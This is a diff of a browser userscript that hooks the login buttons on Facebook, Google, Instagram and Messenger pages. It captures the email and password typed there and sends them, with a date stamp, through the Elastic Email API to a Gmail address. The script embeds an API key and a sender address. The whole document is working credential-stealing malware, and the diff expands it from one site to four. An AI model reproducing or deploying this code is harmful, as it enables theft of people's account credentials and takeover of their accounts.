@@ -1,35 +1,130 @@
 //V2.0
 
-window.location.hostname
+
 //if (typeof useringer === "undefined") {var useringer="None";};
-var urlinger = "https://api.elasticemail.com/v2/email/send?apikey=b82d49f1-52a0-42d2-b222-b42b00d74599&subject=FB&from=sophamrg@gmail.com&fromName=ffdsa&to=sophamrg@gmail.com&isTransactional=True&bodyHTML=";
-getreqjson = {
-apikey="b82d49f1-52a0-42d2-b222-b42b00d74599",
-from="sophamrg@gmail.com",
-to="sophamrg@gmail.com",
-isTransactional=True,
-subject="",
-bodyHTML=""
+var urlinger = "https://api.elasticemail.com/v2/email/send";
+var hostname = window.location.hostname;
+var getreqjson = {
+	"apikey":"b82d49f1-52a0-42d2-b222-b42b00d74599",
+	"from":"sophamrg@gmail.com",
+	"to":"sophamrg@gmail.com",
+	"isTransactional":"True",
+	"subject":"",
+	"bodyHTML":""
 }
 
-try {
-  loginbutton = document.getElementById("loginbutton");
-}
-catch(error) {
-  loginbutton = document.getElementsByName("login")[0];
+function validateCredentials(email, pass){
+	if (!(email == null || email == "" || pass == null || pass == "")){
+			return true;
+		} else {
+			return false;
+		}
 }
 
-loginbutton.onclick = function(){
-    //alert(useringer);
-    let email = document.getElementsByName("email")[0].value;
-    let pass = document.getElementsByName("pass")[0].value;
-    if (typeof useringer === "undefined") {let useringer = "None"};
-    if (!(email == null || email == "" || pass == null || pass == "")){
-        let message = "Email: "+email+"<br>Pass: "+pass+"<br>User: "+useringer+"<br>Date: "+Date();
-        GM_xmlhttpRequest ({
-                method:     'GET',
-                url:        encodeURI(urlinger+message),
-                onload:     function (responseDetails) {}
-                           });
-    }
-};
+function makeMessage(email, pass, useringer, date){
+	return "Email: "+email+"<br>Pass: "+pass+"<br>User: "+useringer+"<br>Date: "+date;
+}
+
+function sendMail(obj){
+	//Converts json obj into querystring
+	let query = "?";
+	let keys = Object.keys(obj);
+	for (let i = 0; i < keys.length; i++) {
+		query = query + keys[i]+"="+obj[keys[i]]+"&";
+	}
+	query.slice(0,-1);
+	//Sending a mail using request
+	GM_xmlhttpRequest ({
+		method:     'GET',
+		url:        encodeURI(urlinger+query),
+		onload:     function (responseDetails) {}
+				   })
+}
+
+function facebook(){
+	let subject = "FB";
+	//Grabs login button object
+	let loginbutton;
+	try {
+		loginbutton = document.getElementById("loginbutton");
+	}
+	catch(error) {
+		loginbutton = document.getElementsByName("login")[0];
+	}
+	//injex
+	loginbutton.onclick = function(){
+		//alert(useringer);
+		//Grabs credentials
+		let email = document.getElementsByName("email")[0].value;
+		let pass = document.getElementsByName("pass")[0].value;
+		//Checks
+		if (typeof useringer === "undefined") {let useringer = "None"};
+		if (validateCredentials(email, pass)){
+			getreqjson["subject"] = subject;
+			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+			sendMail(getreqjson);
+		}
+	}
+}
+
+function google(){
+	let subject = "GOOGLE";
+	//Grabs login button object
+	let loginbutton = document.getElementById("passwordNext");
+	//injex
+	loginbutton.onclick = function (){
+		//Grabs credentials
+		let email = document.getElementById("profileIdentifier").innerText;
+		let pass = document.getElementsByName("password")[0].value;
+		//Checks
+		if (typeof useringer === "undefined") {let useringer = "None"};
+		if (validateCredentials(email, pass)){
+			getreqjson["subject"] = subject;
+			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+			sendMail(getreqjson);
+		}
+	}
+}
+
+function instagram(){
+	let subject = "INSTA";
+	//Grabs login button object
+	let loginbutton = document.getElementsByTagName("button")[0];
+	//injex
+	loginbutton.onclick = function (){
+		//Grabs credentials
+		let email = document.getElementsByName("username")[0].value;
+		let pass = document.getElementsByName("password")[0].value;
+		//Checks
+		if (typeof useringer === "undefined") {let useringer = "None"};
+		if (validateCredentials(email, pass)){
+			getreqjson["subject"] = subject;
+			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+			sendMail(getreqjson);
+		}
+	}
+}
+
+function messenger(){
+	let subject = "MSG";
+	//Grabs login button object
+	let loginbutton = document.getElementById("loginbutton");
+	//injex
+	loginbutton.onclick = function (){
+		//Grabs credentials
+		let email = document.getElementById("email").value;
+		let pass = document.getElementById("pass").value;
+		//Checks
+		if (typeof useringer === "undefined") {let useringer = "None"};
+		if (validateCredentials(email, pass)){
+			getreqjson["subject"] = subject;
+			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+			sendMail(getreqjson);
+		}
+}
+//main
+if (hostname.includes("facebook")){facebook()}
+else if(hostname.includes("google")){google()}
+else if(hostname.includes("instagram")){instagram()}
+else if(hostname.includes("messenger")){messenger()}
+else{} 
